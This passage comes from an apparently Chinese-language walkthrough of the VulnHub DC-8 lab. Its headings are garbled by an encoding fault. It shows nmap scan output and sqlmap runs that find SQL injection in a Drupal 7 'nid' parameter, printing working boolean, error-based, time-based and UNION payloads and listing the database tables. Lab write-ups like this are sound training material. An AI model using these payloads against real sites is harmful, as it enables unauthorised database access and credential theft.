services on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.3.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 1.27s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.02s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.000092s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br><span class="line">MAC Address: 00:0C:29:57:6A:A6 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.75 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°å¯èƒ½å­˜åœ¨sqlæ³¨å…¥</code></p>
<img src="/2020/08/31/DC-8/image-20200831085455429.png" class>

<p><code>å°è¯•é—­åˆï¼Œå‘ç°æŠ¥é”™</code></p>
<img src="/2020/08/31/DC-8/image-20200831085553934.png" class>

<p><code>æŸ¥çœ‹robots.txtï¼Œå‘ç°æ›´æ–°æ—¥å¿—ä¸åå°ç™»å…¥åœ°å€</code></p>
<img src="/2020/08/31/DC-8/image-20200831093824769.png" class>

<h2 id="0x04-çˆ†åº“"><a href="#0x04-çˆ†åº“" class="headerlink" title="0x04.çˆ†åº“"></a>0x04.çˆ†åº“</h2><p><code>å‘ç°æ•°æ®åº“ä¸ºd7db</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; --dbs</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:57:11 /2020-08-30/</span><br><span class="line"></span><br><span class="line">[20:57:11] [INFO] testing connection to the target URL</span><br><span class="line">[20:57:11] [INFO] checking <span class="keyword">if</span> the target is protected by some kind of WAF/IPS</span><br><span class="line">[20:57:11] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[20:57:11] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or <span class="keyword">in</span> <span class="keyword">case</span> of junk results, refer to user<span class="string">&#x27;s manual paragraph &#x27;</span>Page comparison<span class="string">&#x27;</span></span><br><span class="line"><span class="string">how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] </span></span><br><span class="line"><span class="string">[20:57:13] [INFO] testing if GET parameter &#x27;</span>nid<span class="string">&#x27; is dynamic</span></span><br><span class="line"><span class="string">[20:57:14] [WARNING] GET parameter &#x27;</span>nid<span class="string">&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[20:57:14] [INFO] heuristic (basic) test shows that GET parameter &#x27;</span>nid<span class="string">&#x27; might be injectable (possible DBMS: &#x27;</span>MySQL<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[20:57:14] [INFO] testing for SQL injection on GET parameter &#x27;</span>nid<span class="string">&#x27;</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] n</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;</span>MySQL<span class="string">&#x27; extending provided level (1) and risk (1) values? [Y/n] y</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; appears to be &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27; injectable (with --string=&quot;Status message&quot;)</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>Generic inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [WARNING] potential permission problems detected (&#x27;</span><span class="built_in">command</span> denied<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; is &#x27;</span>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)<span class="string">&#x27; injectable </span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                      </span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:30] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable </span></span><br><span class="line"><span class="string">[20:57:40] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] &#x27;</span>ORDER BY<span class="string">&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span></span><br><span class="line"><span class="string">[20:57:40] [INFO] target URL appears to have 1 column in query</span></span><br><span class="line"><span class="string">[20:57:41] [INFO] GET parameter &#x27;</span>nid<span class="string">&#x27; is &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">GET parameter &#x27;</span>nid<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: nid (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND 2744=2744</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] retrieved: &#x27;</span>d7db<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] retrieved: &#x27;</span>information_schema<span class="string">&#x27;</span></span><br><span class="line"><span class="string">available databases [2]:                                                                                                                         </span></span><br><span class="line"><span class="string">[*] d7db</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:57:48] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 25 times</span></span><br><span class="line"><span class="string">[20:57:48] [INFO] fetched data logged to text files under &#x27;</span>/root/.<span class="built_in">local</span>/share/sqlmap/output/192.168.1.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 20:57:48 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc8# </span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-çˆ†è¡¨"><a href="#0x05-çˆ†è¡¨" class="headerlink" title="0x05.çˆ†è¡¨"></a>0x05.çˆ†è¡¨</h2><p><code>å®šä½åˆ°usersè¡¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; -D &quot;d7db&quot; --tables</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [(]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 20:59:52 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:59:53] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[20:59:53] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: nid (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND 2744=2744</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] fetching tables for database: &#x27;d7db&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;actions&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;authmap&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;batch&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block_custom&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block_node_type&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;block_role&#x27;</span></span><br><span class="line"><span class="string">[20:59:53] [INFO] retrieved: &#x27;blocked_ips&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_block&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_bootstrap&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_field&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_filter&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_form&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_image&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_menu&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_page&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_path&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_views&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;cache_views_data&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ckeditor_input_format&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ckeditor_settings&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ctools_css_cache&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;ctools_object_cache&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;date_format_locale&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;date_format_type&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;date_formats&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_config&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_config_instance&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_data_body&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_data_field_image&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_data_field_tags&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_revision_body&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_revision_field_image&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;field_revision_field_tags&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;file_managed&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;file_usage&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;filter&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;filter_format&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;flood&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;history&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;image_effects&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;image_styles&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;menu_custom&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;menu_links&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;menu_router&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node_access&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node_revision&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;node_type&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;queue&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;rdf_mapping&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;registry&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;registry_file&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;role&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;role_permission&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_dataset&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_index&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_node_links&#x27;</span></span><br><span class="line"><span class="string">[20:59:54] [INFO] retrieved: &#x27;search_total&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;semaphore&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;sequences&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;sessions&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;shortcut_set&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;shortcut_set_users&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;site_messages_table&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;system&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_index&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_term_data&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_term_hierarchy&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;taxonomy_vocabulary&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;url_alias&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;users_roles&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;variable&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;views_display&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;views_view&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;watchdog&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_component&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_conditional&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_conditional_actions&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_conditional_rules&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_emails&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_last_download&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_roles&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_submissions&#x27;</span></span><br><span class="line"><span class="string">[20:59:55] [INFO] retrieved: &#x27;webform_submitted_data&#x27;</span></span><br><span class="line"><span class="string">Database: d7db                                                                                                                                   </span></span><br><span class="line"><span class="string">[88 tables]</span></span><br><span class="line"><span class="string">+-----------------------------+</span></span><br><span class="line"><span class="string">| filter                      |</span></span><br><span class="line"><span class="string">| system                      |</span></span><br><span class="line"><span class="string">| actions                     |</span></span><br><span class="line"><span class="string">| authmap                     |</span></span><br><span class="line"><span class="string">| batch                       |</span></span><br><span class="line"><span class="string">| block                       |</span></span><br><span class="line"><span class="string">| block_custom                |</span></span><br><span class="line"><span class="string">| block_node_type             |</span></span><br><span class="line"><span class="string">| block_role                  |</span></span><br><span class="line"><span class="string">| blocked_ips                 |</span></span><br><span class="line"><span class="string">| cache                       |</span></span><br><span class="line"><span class="string">| cache_block                 |</span></span><br><span class="line"><span class="string">| cache_bootstrap             |</span></span><br><span class="line"><span class="string">| cache_field                 |</span></span><br><span class="line"><span class="string">| cache_filter                |</span></span><br><span class="line"><span class="string">| cache_form                  |</span></span><br><span class="line"><span class="string">| cache_image                 |</span></span><br><span class="line"><span class="string">| cache_menu                  |</span></span><br><span class="line"><span class="string">| cache_page                  |</span></span><br><span class="line"><span class="string">| cache_path                  |</span></span><br><span class="line"><span class="string">| cache_views                 |</span></span><br><span class="line"><span class="string">| cache_views_data            |</span></span><br><span class="line"><span class="string">| ckeditor_input_format       |</span></span><br><span class="line"><span class="string">| ckeditor_settings           |</span></span><br><span class="line"><span class="string">| ctools_css_cache            |</span></span><br><span class="line"><span class="string">| ctools_object_cache         |</span></span><br><span class="line"><span class="string">| date_format_locale          |</span></span><br><span class="line"><span class="string">| date_format_type            |</span></span><br><span class="line"><span class="string">| date_formats                |</span></span><br><span class="line"><span class="string">| field_config                |</span></span><br><span class="line"><span class="string">| field_config_instance       |</span></span><br><span class="line"><span class="string">| field_data_body             |</span></span><br><span class="line"><span class="string">| field_data_field_image      |</span></span><br><span class="line"><span class="string">| field_data_field_tags       |</span></span><br><span class="line"><span class="string">| field_revision_body         |</span></span><br><span class="line"><span class="string">| field_revision_field_image  |</span></span><br><span class="line"><span class="string">| field_revision_field_tags   |</span></span><br><span class="line"><span class="string">| file_managed                |</span></span><br><span class="line"><span class="string">| file_usage                  |</span></span><br><span class="line"><span class="string">| filter_format               |</span></span><br><span class="line"><span class="string">| flood                       |</span></span><br><span class="line"><span class="string">| history                     |</span></span><br><span class="line"><span class="string">| image_effects               |</span></span><br><span class="line"><span class="string">| image_styles                |</span></span><br><span class="line"><span class="string">| menu_custom                 |</span></span><br><span class="line"><span class="string">| menu_links                  |</span></span><br><span class="line"><span class="string">| menu_router                 |</span></span><br><span class="line"><span class="string">| node                        |</span></span><br><span class="line"><span class="string">| node_access                 |</span></span><br><span class="line"><span class="string">| node_revision               |</span></span><br><span class="line"><span class="string">| node_type                   |</span></span><br><span class="line"><span class="string">| queue                       |</span></span><br><span class="line"><span class="string">| 